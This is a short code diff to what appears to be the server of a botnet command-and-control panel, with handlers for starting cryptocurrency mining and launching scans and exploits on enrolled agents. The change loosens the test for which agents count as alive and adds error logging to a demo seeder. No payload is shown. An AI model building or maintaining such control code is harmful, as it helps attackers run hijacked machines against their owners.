@@ -7353,10 +7353,10 @@ def mining_start_all():
     try:
         db = get_db()
         
-        # Get all online agents
+        # Get all agents (is_alive=1 OR recently seen)
         agents = db.execute("""
             SELECT id FROM agents 
-            WHERE last_seen > datetime('now', '-5 minutes')
+            WHERE is_alive = 1 OR last_seen > datetime('now', '-1 hour')
         """).fetchall()
         
         if not agents:
@@ -7492,7 +7492,7 @@ def exploitation_scan():
         
         agents = db.execute("""
             SELECT id FROM agents 
-            WHERE last_seen > datetime('now', '-5 minutes')
+            WHERE is_alive = 1 OR last_seen > datetime('now', '-1 hour')
         """).fetchall()
         
         if not agents:
@@ -7527,7 +7527,7 @@ def exploitation_exploit():
         
         agents = db.execute("""
             SELECT id FROM agents 
-            WHERE last_seen > datetime('now', '-5 minutes')
+            WHERE is_alive = 1 OR last_seen > datetime('now', '-1 hour')
         """).fetchall()
         
         if not agents:
@@ -8936,8 +8936,10 @@ def seed_demo_data():
                     (id, hostname, username, os, arch, ip_internal, platform_type, first_seen, last_seen, is_alive)
                     VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'), datetime('now'), 1)
                 """, (agent_id, hostname, username, os_type, arch, ip, platform_type))
-            except:
-                pass
+                # Update is_alive separately to ensure it's set
+                db.execute("UPDATE agents SET is_alive = 1 WHERE id = ?", (agent_id,))
+            except Exception as e:
+                print(f"Error seeding agent {agent_id}: {e}")
         
         # Demo tasks
         demo_tasks = [
